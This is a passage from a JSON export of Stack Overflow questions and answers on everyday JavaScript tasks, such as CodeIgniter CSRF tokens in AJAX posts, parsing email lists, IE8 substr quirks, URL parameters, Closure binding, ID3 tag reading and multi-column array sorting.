            "body": "<p>I've made a simple autoload function that loads content when you scroll down on a website. However, there seems to be a few problems when i enable CSRF protection in Codeigniter.</p>\n\n<p>I'm not using a form, so i don't know how i can send the token from A to B when i'm doing my post request as you scroll.</p>\n\n<p>My JavaScript</p>\n\n<pre><code>if (location.href == baseurl) {\n    $(window).scroll(function(){\n        if ($(window).scrollTop() &gt; $('body').height() / 2) {\n            if(doScroll == 1) {\n                $.post(baseurl + 'ajax/images',{'id' : ID}, function(data) {\n                    $(\"#wrapper_content\").append(data);\n                    if(data == 'Det finnes ikke flere bilder i databasen, WTF!? Send inn forslag ASAP!') {\n                        doScroll = 0;\n                    }\n                    ID++;\n                });\n            }\n        }\n    });\n}\n</code></pre>\n\n<p>Since Codeigniter expects a TOKEN on all POST request i can't get this to work when CSRF i enabled. Any suggestions?</p>\n\n<p>Error when CSRF is Enabled</p>\n\n<blockquote>\n  <p>Failed to load resource: the server responded with a status of 500 (Internal Server Error)</p>\n</blockquote>\n\n<p>If i turn CSRF off, everything works great...</p>\n",
            "last_activity_date": 1419175379,
            "question_id": 7348383,
            "score": 4,
            "tags": [
                "javascript",
                "ajax",
                "codeigniter",
                "token"
            ],
            "title": "Codeigniter ajax CSRF problem"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>This regex should remove anything in double-quotes as well as <code>&lt;</code> and <code>&gt;</code> characters.</p>\n\n<pre><code>/\".*?\"|[&lt;&gt;]/\n</code></pre>\n\n<p>In Javascript, you might have something along these lines:</p>\n\n<pre><code>line.replace(/\".*?\"|[&lt;&gt;]/g, '');\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<pre><code>myEmailList=userInput.match(/[a-zA-z0-9_.]+@[a-zA-Z0-9_.]+\\.(com|org|whatever)/g);\nmyEmailListString=myEmailList.join(', ');\n</code></pre>\n\n<p>Or just do the first line if you're wanting an array of the email addresses.</p>\n",
                    "is_accepted": true,
                    "score": -2
                },
                {
                    "body": "<p>Valid email address can be <em>very</em> strange, so I'd suggest to not forbidding anything in that field otherwise may be well possible that your program is useless because your users will not be able to send email to valid email addresses.</p>\n\n<p>To read the whole story <a href=\"http://haacked.com/archive/2007/08/21/i-knew-how-to-validate-an-email-address-until-i.aspx\" rel=\"nofollow\">see this blog post</a> or go for the RFC yourself.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<pre><code>inputval.match(/[A-z0-9]+@[A-z0-9]+.[A-z]{2,3}/g)\n</code></pre>\n\n<p>That's a very simplified one.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><code>var emailList = userInput.replace(/[^,;]*.?&lt;/g,\"\").replace(/&gt;/g,\"\").replace(/[,; ]{1,}/g, \"\\n\").replace(/[\\n]{2,}/g, \"\\n\").split(\"\\n\")</code>;</p>\n\n<p>This allows the email list to be provided in the following formats (including copy and paste email list from you Google To box)\n\"Bob Rob\", job@company.com; rob@company.com job@somewhere.com</p>\n\n<p>The email Ids can be separeted by \",\", \";\", or new lines.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>Similar to <a href=\"http://stackoverflow.com/questions/6964879/how-to-parse-this-string-to-extract-email-addresses\">this question</a>, but not sure how to implement in this case.</p>\n\n<p>A trusted user (don't need to be concerned with validating input) is typing/pasting email addresses into a text field.  On the blur event, I'd like to look at the text and clean up whatever he inputed (typically after copying and pasting a list of addresses from an email client).</p>\n\n<p><code>\"Bob Smith\" &lt;bob@company.com&gt;, joe@company.com, \"John Doe\"&lt;john@company.com&gt;</code></p>\n\n<p>would be trimmed to:</p>\n\n<p><code>bob@company.com, joe@company.com, john@company.com</code></p>\n",
            "last_activity_date": 1331867395,
            "question_id": 7098581,
            "score": 4,
            "tags": [
                "javascript",
                "parsing",
                "email"
            ],
            "title": "How to parse/trim email addresses from text"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p><strong>Update:</strong> As commenters have pointed out (and I can't prove them otherwise for now), I removed the first suggestion.</p>\n\n<p>Couple of more things to note:</p>\n\n<p><code>onload</code> event will not fire if the image is being loaded from cache. Try clearing your cache and retry.</p>\n\n<p>Another problem is that IE doesn't like negative in <code>substr</code>. Use <code>slice</code> instead:</p>\n\n<pre><code>\"0000000\".slice(-(String(MAX_IMAGES).length));\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Two ways of dealing with this:</p>\n\n<ol>\n<li><p>Add a nonce parameter to your image URLs.</p>\n\n<pre><code>var nonce = new Date().getTime();\n\n// ...\n\npreloadImage.src = fullImagePrefix + imageNumber + \".\" + IMAGES_TLA + ('?_=' + nonce++);\n</code></pre></li>\n<li><p>Set the \"src\" property in a different event loop.</p>\n\n<pre><code>setTimeout(function(img, src) {\n  img.src = src;\n}(preloadImage, fullImagePrefix + imageNumber + \".\" + IMAGES_TLA), 1);\n</code></pre></li>\n</ol>\n\n<p>By using a nonce parameter each time you fetch an image, you bypass the cache. Now, that's probably not such a great idea, so the second option gets around the problem by making sure that the \"src\" property is set in a separate event loop.  The \"load\" will trigger then.</p>\n\n<p><a href=\"http://jsfiddle.net/e8uFa/5/\" rel=\"nofollow\">Here</a> is an example.  The code uses nonces on some images but sets the \"src\" for all of them in a timeout handler. As you can see, they all load (turn red).</p>\n\n<p>I don't know why IE doesn't fire the \"load\" handler when the image is in cache, but it does when the \"src\" is set in a different event loop from where the image object is (otherwise) initialized.</p>\n\n<p><em>edit</em> &mdash; <a href=\"http://jsfiddle.net/e8uFa/6/\" rel=\"nofollow\">Here</a> is that same fiddle, but modified to skip the timeout. In IE8, you should notice that the even-numbered images often don't get a call made to the \"load\" handlers.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Now that this question is retitled to be about <code>substr()</code> in IE 8, here's the quick fix to the negative index problem.  Paste the following code from <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/substr\">Mozilla Developer Network</a>:</p>\n\n<pre><code> // only run when the substr function is broken\n if ('ab'.substr(-1) != 'b')\n {\n   /**\n    *  Get the substring of a string\n    *  @param  {integer}  start   where to start the substring\n    *  @param  {integer}  length  how many characters to return\n    *  @return {string}\n    */\n   String.prototype.substr = function(substr) {\n     return function(start, length) {\n       // did we get a negative start, calculate how much it is from the beginning of the string\n       if (start &lt; 0) start = this.length + start;\n\n       // call the original function\n       return substr.call(this, start, length);\n     }\n   }(String.prototype.substr);\n }\n</code></pre>\n\n<p>This code detects the broken implementation of substr and replaces it with a compliant one.</p>\n",
                    "is_accepted": false,
                    "score": 9
                }
            ],
            "body": "<p>EDIT:I've changed the title, because the issue had nothing to do with IE image.load() firing - my substr() wasn't working (see accepted answer).</p>\n\n<hr>\n\n<p>There's a ton of posts about making sure that you define your onload handler prior to assigning img.src in order to guarantee that the onload handler is in place in case the image is loaded from cache first.</p>\n\n<p>This does not appear to the be issue in my code, since that's precisely what I have done.</p>\n\n<p>Note that this script works across all other browsers, but IE 8 and lower does not trigger the onload inline function.</p>\n\n<pre><code>var i = lastSlideIndex || 1;\n\nwhile(imagesQueued &lt; MAX_IMAGES){\n    var preloadImage = new Image();\n    preloadImage.arrayIndex = i;\n    preloadImage.onload = function(eventObj){\n        debug('Image ' + this.src + ' loaded.');\n        slideshowImages[this.arrayIndex] = this;\n        if (this.arrayIndex &gt; lastImageIndex) lastImageIndex = this.arrayIndex;\n        triggerSlideshow(this.arrayIndex);\n    }\n\n    // add leading zeros\n    var leadingZeros = \"0000000\".substr(-(String(MAX_IMAGES).length));\n    imageNumber = leadingZeros.substr(String(i).length) + i;\n\n    debug('preloading Image #' + imageNumber);\n    preloadImage.src = fullImagePrefix + imageNumber + \".\" + IMAGES_TLA;\n\n    if (++i &gt; MAX_IMAGES) i = 1;\n    imagesQueued++;\n}\n</code></pre>\n\n<p>Any other suggestions would be deeply appreciated!</p>\n",
            "last_activity_date": 1360725735,
            "question_id": 6918943,
            "score": 4,
            "tags": [
                "javascript",
                "onload",
                "explorer",
                "slice",
                "substr"
            ],
            "title": "substr() with negative value not working in IE"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<pre><code>if(location.search === \"\") {\n    location.href = location.href + \"?priceMin=300\";\n} else {\n    location.href = location.href + \"&amp;priceMin=300\";\n}\n</code></pre>\n\n<p>In case <code>location.search === \"\"</code>, then there is no <code>?</code> part.</p>\n\n<p>So add <code>?newpart</code> so that it becomes <code>.php?newpart</code>.</p>\n\n<p>Otherwise there is a <code>?</code> part already.</p>\n\n<p>So add <code>&amp;newpart</code> so that it becomes <code>.php?existingpart&amp;newpart</code>.</p>\n\n<hr>\n\n<p>Thanks to hakre, you can also simply set it like:</p>\n\n<pre><code>location.search += \"&amp;newpart\";\n</code></pre>\n\n<p>It will automatically add <code>?</code> if necessary (if not apparent, it will make it <code>?&amp;newpart</code> this way, but that should not matter).</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>If you're having the user fill out a textfield with a minimum price, why not let the form submit as a GET-request with a blank action? IIRC, that should do just what you want, without any javascript. </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>use <code>var urlString = window.location</code> to get the url</p>\n\n<p>check if the url already contains a '?' with <code>urlString.indexOf('?')</code>, -1 means it doesnt exist.</p>\n\n<p>set <code>window.location</code> to redirect</p>\n\n<p>this is like 101 of javascript. try some search engines!</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>&lt;FORM action=\"\" method=\"get\"&gt;\n&lt;P&gt;\n&lt;LABEL for=\"brand\"&gt;Brand: &lt;/LABEL&gt;\n          &lt;INPUT type=\"text\" id=\"brand\"&gt;&lt;BR&gt;\n&lt;LABEL for=\"priceMin\"&gt;Minimum Price: &lt;/LABEL&gt;\n          &lt;INPUT type=\"text\" id=\"priceMin\"&gt;&lt;BR&gt;\n&lt;/P&gt;\n</code></pre>\n\n<p></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>try something like this, it should consider also cases when you already have that param in url:</p>\n\n<pre><code>function addOrUpdateUrlParam(name, value)\n{\n  var href = window.location.href;\n  var regex = new RegExp(\"[&amp;\\\\?]\" + name + \"=\");\n  if(regex.test(href))\n  {\n    regex = new RegExp(\"([&amp;\\\\?])\" + name + \"=\\\\d+\");\n    window.location.href = href.replace(regex, \"$1\" + name + \"=\" + value);\n  }\n  else\n  {\n    if(href.indexOf(\"?\") &gt; -1)\n      window.location.href = href + \"&amp;\" + name + \"=\" + value;\n    else\n      window.location.href = href + \"?\" + name + \"=\" + value;\n  }\n}\n</code></pre>\n\n<p>then you invoke it like in your case:</p>\n\n<pre><code>addOrUpdateUrlParam('priceMin', 300);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<pre><code>var applyMinPrice = function(minPrice) {\n    var existingParams = (location.href.indexOf('?') !== -1),\n        separator = existingParams ? '&amp;' : '?',\n        newParams = separator + 'priceMin=' + minPrice;\n\n    location.href += newParams;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Actually this is totally trivial, because the javascript location object already deals with this. Just encapsulate this one-liner into a function to re-use it with links etc:</p>\n\n<pre><code>&lt;script&gt;\n    function addParam(v) {\n        window.location.search += '&amp;' + v;\n    }\n&lt;/script&gt;\n\n&lt;a href=\"javascript:addParam('priceMin=300');\"&gt;add priceMin=300&lt;/a&gt;\n</code></pre>\n\n<p>There is no need to check for <code>?</code> as this is already the <code>search</code> part and you only need to add the param.</p>\n\n<p>If you don't want to even make use of a function you can write as so:</p>\n\n<pre><code>&lt;a href=\"javascript:location.search+='&amp;priceMin=300';\"&gt;add priceMin=300&lt;/a&gt;\n</code></pre>\n\n<p>Keep in mind that this does exactly what you've asked for: To add that specific parameter. It can already be part of the <code>search</code> part because you can have the same parameter more than once in an URI. You might want to normalize that within your application, but that's another field. I would centralize URL-normalization into a function of it's own.</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>In discussion about the accepted answer above it became clear, that the following conditions should be met to get a working function:</p>\n\n<ul>\n<li>if the parameter already exists, it should be changed.</li>\n<li>if the parameter already exists multiple times, only the changed copy should survive.</li>\n<li>if the parameter already exists, but have no value, the value should be set.</li>\n</ul>\n\n<p>As <code>search</code> already provides the search string, the only thing left to achieve is to parse that query-info part into the name and value pairs, change or add the missing name and value and then add it back to <code>search</code>:</p>\n\n<pre><code>&lt;script&gt;\n    function setParam(name, value) {\n        var l = window.location;\n\n        /* build params */\n        var params = {};        \n        var x = /(?:\\??)([^=&amp;?]+)=?([^&amp;?]*)/g;        \n        var s = l.search;\n        for(var r = x.exec(s); r; r = x.exec(s))\n        {\n            r[1] = decodeURIComponent(r[1]);\n            if (!r[2]) r[2] = '%%';\n            params[r[1]] = r[2];\n        }\n\n        /* set param */\n        params[name] = encodeURIComponent(value);\n\n        /* build search */\n        var search = [];\n        for(var i in params)\n        {\n            var p = encodeURIComponent(i);\n            var v = params[i];\n            if (v != '%%') p += '=' + v;\n            search.push(p);\n        }\n        search = search.join('&amp;');\n\n        /* execute search */\n        l.search = search;\n    }\n&lt;/script&gt;\n\n&lt;a href=\"javascript:setParam('priceMin', 300);\"&gt;add priceMin=300&lt;/a&gt;\n</code></pre>\n\n<p>This at least is a bit more robust as it can deal with URLs like these:</p>\n\n<pre><code>test.html?a?b&amp;c&amp;test=foo&amp;priceMin=300\n</code></pre>\n\n<p>Or even:</p>\n\n<pre><code>test.html?a?b&amp;c&amp;test=foo&amp;pri%63eMin=300\n</code></pre>\n\n<p>Additionally, the added name and value are always properly encoded. Where this might fail is if a parameter name results in an illegal property js label.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<pre><code>&lt;html&gt;\n&lt;body&gt;\n..\n..\n..\n\n&lt;?php\n$priceMinValue= addslashes ( $_GET['priceMin']);\nif (!empty($priceMin)) {\n        $link = \"currentpage.php?priceMin=\". $priceMinValue;\n        die(\"&lt;script&gt;location.href = '\".$link. \"'&lt;/script&gt;\");    \n}\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>My current URL is: <code>http://something.com/mobiles.php?brand=samsung</code></p>\n\n<p>Now when a user clicks on a minimum price filter (say 300), I want my URL to become</p>\n\n<p><code>http://something.com/mobiles.php?brand=samsung&amp;priceMin=300</code></p>\n\n<p>In other words, I am looking for a javascript function which will add a specified parameter in the current URL and then re-direct the webpage to the new URL. </p>\n\n<p>Note: If no parameters are set then the function should add <code>?</code> instead of <code>&amp;</code></p>\n\n<p>i.e. if the current URL is <code>http://something.com/mobiles.php</code> then page should be re-directed to <code>http://something.com/mobiles.php?priceMin=300</code>\ninstead of <code>http://something.com/mobiles.php&amp;priceMin=300</code></p>\n",
            "last_activity_date": 1413529003,
            "question_id": 6899097,
            "score": 4,
            "tags": [
                "php",
                "javascript",
                "url",
                "web-applications"
            ],
            "title": "How to add a parameter to the URL?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p><code>goog.bind</code> is the general purpose solution. For example:</p>\n\n<pre><code>goog.bind(this.someFunction, this);\ngoog.bind(this.someFunction, this, arg1);\ngoog.bind(this.someFunction, this, arg1, arg2);\n</code></pre>\n\n<p>The framework is generally designed such that this can be avoided, so it's not common to have to explicitly call <code>goog.bind</code>.</p>\n\n<p>For example, <code>goog.events.EventHandler</code> automatically binds callbacks to the handler you set in its constructor.</p>\n\n<pre><code>var handler = new goog.events.EventHandler(this);\nhandler.listen(something, 'something', this.someFunction); // no need to bind\n</code></pre>\n\n<p>The array functions also support a handler argument.</p>\n\n<pre><code>goog.array.forEach(elements, this.someFunction, this);\nvar items = goog.array.map(elements, this.someFunction, this);\n</code></pre>\n\n<p>And so on. Most parts of the framework make it pretty easy to do this, it's very well designed for \"pseudo-classic\" inheritance.</p>\n\n<p>For more details, see <a href=\"http://www.bolinfest.com/javascript/inheritance.php\" rel=\"nofollow\">http://www.bolinfest.com/javascript/inheritance.php</a></p>\n",
                    "is_accepted": true,
                    "score": 3
                }
            ],
            "body": "<p>What is the <em>Google Closure</em>'s solution for resolving the issues with the <code>this</code> keyword in JavaScript callback functions. It would be so useful in <strong>OO</strong> style programming.</p>\n\n<p>Is there any conventions or style for <strong>OOP</strong> in <em>Google Closure</em>???</p>\n\n<p><strong>update</strong>\nHow can I access this.darklayer in ViewportSizeMonitor handler???</p>\n\n<pre><code>    goog.require('goog.dom');\ngoog.require('goog.events');\ngoog.require('goog.events.EventType');\ngoog.require('goog.math.Size');\ngoog.require('goog.style');\n\ngoog.require('goog.dom.ViewportSizeMonitor');\n\ngoog.provide('ehsun7b.ajax.AjaxBox');\n\nehsun7b.ajax.AjaxBox = function (url, containerClass) {\n  try {\n    this.url = url;\n    this.containerClass = containerClass;\n\n    var viwportSize = goog.dom.getViewportSize();\n    this.darklayer = goog.dom.createDom(\"div\", {\n      \"style\": \"width: \" + viwportSize.width + \"px;\" + \"height: \" + \n      viwportSize.height + \"px;\" +\n      \"background-image: url('css/img/50black.png');\" +\n      \"z-index: 1000;\" +\n      \"position: absolute;\" +\n      \"left: 0px; top: 0px;\"\n    });\n\n    var vsm = new goog.dom.ViewportSizeMonitor();\n    goog.events.listen(vsm, goog.events.EventType.RESIZE, function(e) {\n      console.log(\"this: \" + this.darklayer);\n    });\n\n    this.container = goog.dom.createDom(\"div\", {\n      \"class\": this.containerClass\n    });    \n    goog.dom.appendChild(this.darklayer, this.container);\n    goog.dom.setTextContent(this.container, \"hello ajax box\");    \n\n    this.show = function() {\n      goog.dom.appendChild(document.body, this.darklayer);\n    },\n\n    this.hide = function() {    \n      goog.dom.removeNode(this.darklayer);\n    }\n  } catch (e) {\n    console.log(\"error: \" + e);\n  }\n};\n</code></pre>\n\n<p><strong>I changed my class according to the Closure's style this way:</strong></p>\n\n<pre><code>goog.require('goog.dom');\ngoog.require('goog.events');\ngoog.require('goog.events.EventType');\ngoog.require('goog.math.Size');\ngoog.require('goog.style');\n\ngoog.require('goog.dom.ViewportSizeMonitor');\n\ngoog.provide('ehsun7b.ajax.AjaxBox');\n\nehsun7b.ajax.AjaxBox = function (url, containerClass) {\n  try {\n    this.url = url;\n    this.containerClass = containerClass;\n\n    var viwportSize = goog.dom.getViewportSize();\n    this.darklayer = goog.dom.createDom(\"div\", {\n      \"style\": \"width: \" + viwportSize.width + \"px;\" + \"height: \" + \n      viwportSize.height + \"px;\" +\n      \"background-image: url('css/img/50black.png');\" +\n      \"z-index: 1000;\" +\n      \"position: absolute;\" +\n      \"left: 0px; top: 0px;\"\n    });\n\n    var vsm = new goog.dom.ViewportSizeMonitor();\n    goog.events.listen(vsm, goog.events.EventType.RESIZE, function(e) {\n      console.log(\"this: \" + this.darklayer);\n    });\n\n    this.container = goog.dom.createDom(\"div\", {\n      \"class\": this.containerClass\n    });    \n    goog.dom.appendChild(this.darklayer, this.container);\n    goog.dom.setTextContent(this.container, \"hello ajax box\");                   \n  } catch (e) {\n    console.log(\"error: \" + e);\n  }\n};\n\nehsun7b.ajax.AjaxBox.prototype.show = function() {\n  goog.dom.appendChild(document.body, this.darklayer);\n}\n\nehsun7b.ajax.AjaxBox.prototype.hide = function() {    \n  goog.dom.removeNode(this.darklayer);\n}\n</code></pre>\n",
            "last_activity_date": 1309415165,
            "question_id": 6527192,
            "score": 4,
            "tags": [
                "javascript",
                "oop",
                "this",
                "bind",
                "google-closure-library"
            ],
            "title": "Google Closure bind / resolve issues with the this keyword"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>As @joekarl has pointed out, there are libraries to do this for you.  I saw your request for info so you can do it yourself, but here's a gem from the 500+ or so lines from the library on <a href=\"http://blog.nihilogic.dk/2008/08/reading-id3-tags-with-javascript.html\" rel=\"nofollow\">nihilogic.dk</a>:</p>\n\n<pre><code>var iLong = bBigEndian ? \n            (((((iByte1 &lt;&lt; 8) + iByte2) &lt;&lt; 8) + iByte3) &lt;&lt; 8) + iByte4\n            : (((((iByte4 &lt;&lt; 8) + iByte3) &lt;&lt; 8) + iByte2) &lt;&lt; 8) + iByte1;\n        if (iLong &lt; 0) iLong += 4294967296;\n        return iLong;\n</code></pre>\n\n<p>Not to mention a significant amount of pure Javascript AJAX work.</p>\n\n<p>There's no reason to reinvent this wheel.  However, if you want to look at the code and rewrite it for whatever reason, here are the two libraries files:</p>\n\n<p><a href=\"http://nihilogic.dk/labs/binaryajax/binaryajax.js\" rel=\"nofollow\">binary ajax library</a><br>\n<a href=\"http://nihilogic.dk/labs/id3/id3.js\" rel=\"nofollow\">id3 parser</a></p>\n\n<p>If you really want to cut out any of the AJAX and just start with reading a file you already have (somehow, without AJAX), the second link has a function called, coincidentally, <code>readTagsFromData</code>.  I suggest you start there for your goals.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>There's no need to use binaryajax.js or id3 parser lib anymore. In Chrome at, you can use <code>FileReader</code> and <code>DataView</code> to read and extract the ID3v1 info. It's just a few lines:</p>\n\n<p><a href=\"http://ericbidelman.tumblr.com/post/8343485440/reading-mp3-id3-tags-in-javascript\">http://ericbidelman.tumblr.com/post/8343485440/reading-mp3-id3-tags-in-javascript</a></p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>This library has good docs. I love GitHub</p>\n\n<p><a href=\"https://github.com/leetreveil/node-musicmetadata\" rel=\"nofollow\">https://github.com/leetreveil/node-musicmetadata</a></p>\n\n<hr>\n\n<h2>API</h2>\n\n<pre><code>var fs = require('fs');\nvar mm = require('musicmetadata');\n\n//create a new parser from a node ReadStream\nvar parser = new mm(fs.createReadStream('sample.mp3'));\n\n//listen for the metadata event\nparser.on('metadata', function (result) {\n  console.log(result);\n});\n</code></pre>\n\n<p>This will output the standard music metadata:</p>\n\n<pre><code>{ artist : ['Spor'],\n  album : 'Nightlife, Vol 5.',\n  albumartist : [ 'Andy C', 'Spor' ],\n  title : 'Stronger',\n  year : '2010',\n  track : { no : 1, of : 44 },\n  disk : { no : 1, of : 2 },\n  picture : [ { format : 'jpg', data : &lt;Buffer&gt; } ]\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I know this has been asked here before but my conditions are a little different. I am making a chrome app so i have access to all the latest JavaScript file apis it supports without worrying about compatibility. More over i would really like to do this my self.. ie without any library. A tutorial or a guide will do. After all how difficult can it really be?</p>\n\n<p>Basically i have mp3's that user adds and i want to be able to read most basic information like artist and Album (actually, just these two but others wont do any harm).</p>\n\n<p>I believe i have the idea of what id3 tag is and how can the info be read. I just have to see it in action just once.\nThanks</p>\n",
            "last_activity_date": 1380233237,
            "question_id": 6332384,
            "score": 4,
            "tags": [
                "javascript",
                "audio"
            ],
            "title": "read id3 tags from mp3 using javascript"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Thanks for everyone who looked into this.</p>\n\n<p>Anyway, just as one could expect, not after five minutes after submitting the question, I found <a href=\"http://stackoverflow.com/questions/150814/how-to-handle-an-activex-event-in-javascript\">How to handle an ActiveX event in Javascript</a> question about ActiveX callback handlers in IE, so it answers the main part of the question. As well, as the question that @outis has linked.</p>\n\n<p>But I can't find any documentation on MSDN and that's troubling.</p>\n\n<p><strong>Conclusion</strong>: this is IE-specific ECMAScript extension for event handler declaration.</p>\n",
                    "is_accepted": true,
                    "score": 2
                }
            ],
            "body": "<p>Today I found this code snippet:</p>\n\n\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;object ID=\"FF\" CLASSID=\"clsid:guid\" CODEBASE=\"url\" VIEWASTEXT&gt;&lt;/object&gt;\n&lt;object ID=\"FileSaver\" CLASSID=\"clsid:guid\" CODEBASE=\"url\" VIEWASTEXT&gt;&lt;/object&gt;\n\u2026\n&lt;script language=\"javascript\"&gt;\n    function FileSaver::OnFinished(Status){\u2026}\n    function FF::OnFinished(Status){\u2026}\n&lt;/script&gt;\n</code></pre>\n\n<p>I can't find <em>anything</em> relevant to explain this syntax. Is it really javascript? Is it correct? If not, how the code should look like?</p>\n\n<p>This is a single page without external script links.\nNote that function declarations are directly inside <code>&lt;script&gt;</code> block.</p>\n",
            "last_activity_date": 1307615983,
            "question_id": 6185878,
            "score": 4,
            "tags": [
                "javascript",
                "html",
                "activex"
            ],
            "title": "Double colons in function declaration in Javascript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I would suggest writing a higher-order function which takes the orderList and orderDir as arguments and returns a comparator function which can be passed directly to Array#sort.  This way you can try different implementations (which trade off simplicity for performance, for example).</p>\n\n<p>This untested code demonstrates the idea:</p>\n\n<pre><code>var getComparator = function(orderList, orderDir) {\n  var len = orderList.length; // XXX: assume == orderDir.length\n  return function(a, b) {\n    var cmp, ax, bx, i;\n    for (i=0; i&lt;len; i++) { # For each field and direction...\n      ax = a[orderList[i]];\n      bx = b[orderList[i]];\n      cmp = ax.localeCompare(bx); # compare elements...\n      if (cmp != 0) { # if not equal then indicate order...\n        return (orderDir[i]=='asc') ? -1 : 1;\n      }\n    }\n    return 0; # otherwise, indicate equality.\n  };\n};\ndataArr.sort(getComparator(orderList, orderDir));\n</code></pre>\n\n<p>Note that you'll want to be careful about using \"localeCompare\" vs subtraction for strings vs numbers, so perhaps that aspect could be parameterized to the getComparator function as well.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The array literal <code>[]</code> is preferred over <code>new Array</code>. The notation <code>{0,4,3,1}</code> is not valid and should be <code>[0,4,3,1]</code>.</p>\n\n<p>Is there a need for reinventing the wheel? Two arrays can be joined using:</p>\n\n<pre><code>originalArray = originalArray.concat(addArray);\n</code></pre>\n\n<p>Elements can be appended to the end using:</p>\n\n<pre><code>array.push(element);\n</code></pre>\n\n<p>Arrays have a method for sorting the array. By default, it's sorted numerically:</p>\n\n<pre><code>// sort elements numerically\nvar array = [1, 3, 2];\narray.sort(); // array becomes [1, 2, 3]\n</code></pre>\n\n<p>Arrays can be reversed as well. Continuing the previous example:</p>\n\n<pre><code>array = array.reverse(); //yields [3, 2, 1]\n</code></pre>\n\n<p>To provide custom sorting, you can pass the optional function argument to <code>array.sort()</code>:</p>\n\n<pre><code>array = [];\narray[0] = [1, \"first element\"];\narray[1] = [3, \"second element\"];\narray[2] = [2, \"third element\"];\narray.sort(function (element_a, element_b) {\n    return element_a[0] - element_b[0];\n});\n/** array becomes (in order):\n * [1, \"first element\"]\n * [2, \"third element\"]\n * [3, \"second element\"]\n */\n</code></pre>\n\n<p>Elements will retain their position if the element equals an other element. Using this, you can combine multiple sorting algoritms. You must apply your sorting preferences in reverse order since the last sort has priority over previous ones. To sort the below array by the first column (descending order) and then the second column (ascending order):</p>\n\n<pre><code>array = [];\narray.push([1, 2, 4]);\narray.push([1, 3, 3]);\narray.push([2, 1, 3]);\narray.push([1, 2, 3]);\n// sort on second column\narray.sort(function (element_a, element_b) {\n    return element_a[1] - element_b[1];\n});\n// sort on first column, reverse sort\narray.sort(function (element_a, element_b) {\n    return element_b[0] - element_a[0];\n});\n/** result (note, 3rd column is not sorted, so the order of row 2+3 is preserved)\n * [2, 1, 3]\n * [1, 2, 4] (row 2)\n * [1, 2, 3] (row 3)\n * [1, 3, 3]\n */\n</code></pre>\n\n<p>To sort latin strings (i.e. English, German, Dutch), use <code>String.localeCompare</code>:</p>\n\n<pre><code>array.sort(function (element_a, element_b) {\n    return element_a.localeCompare(element_b);\n});\n</code></pre>\n\n<p>To sort date's from the <code>Date</code> object, use their milliseconds representation:</p>\n\n<pre><code>array.sort(function (element_a, element_b) {\n    return element_a.getTime() - element_b.getTime();\n});\n</code></pre>\n\n<p>You could apply this sort function to all kind of data, just follow the rules:</p>\n\n<p><code>x</code> is the result from comparing two values which should be returned by a function passed to <code>array.sort</code>.</p>\n\n<ol>\n<li><code>x &lt; 0</code>: <code>element_a</code> should come before <code>element_b</code></li>\n<li><code>x = 0</code>: <code>element_a</code> and <code>element_b</code> are equal, the elements are not swapped</li>\n<li><code>x &gt; 0</code>: <code>element_a</code> should come after <code>element_b</code></li>\n</ol>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>Based on Lekensteyn's excellent response, I've developed the following solution to my needs.  I haven't done full QA testing on it yet and don't know if it is perfect (in fact, I'm quite sure it's not), but I hope that others can get some use out of this and build upon it for their needs.  I'll post an update if any major changes needed made.</p>\n\n<pre><code>function do2DArraySort(dataArr, orderList, orderDir) {\n    for (x=orderList.length-1; x &gt;= 0; x--) {\n        if (orderDir[x] == 'asc') {\n            dataArr.sort(sortMethodFunctionAsc);\n        } else {\n            dataArr.sort(sortMethodFunctionDesc);\n        }\n    }\n\n    return dataArr;\n}\n\nfunction sortMethodFunctionAsc(a, b) {\n    if ((IsNumeric(a[orderList[x]]) &amp;&amp; IsNumeric(b[orderList[x]])) || (IsDate(a[orderList[x]]) &amp;&amp; IsDate(b[orderList[x]]))) {\n        return a[orderList[x]] - b[orderList[x]];\n    } else {\n        if (a[orderList[x]].toString() &gt; b[orderList[x]].toString()) {\n            return 1;\n        } else if (a[orderList[x]].toString() &lt; b[orderList[x]].toString()) {\n            return -1;\n        } else {\n            return 0;\n        }\n    }\n}\n\nfunction sortMethodFunctionDesc(a, b) {\n    if ((IsNumeric(a[orderList[x]]) &amp;&amp; IsNumeric(b[orderList[x]])) || (IsDate(a[orderList[x]]) &amp;&amp; IsDate(b[orderList[x]]))) {\n        return b[orderList[x]] - a[orderList[x]];\n    } else {\n        if (a[orderList[x]].toString() &lt; b[orderList[x]].toString()) {\n            return 1;\n        } else if 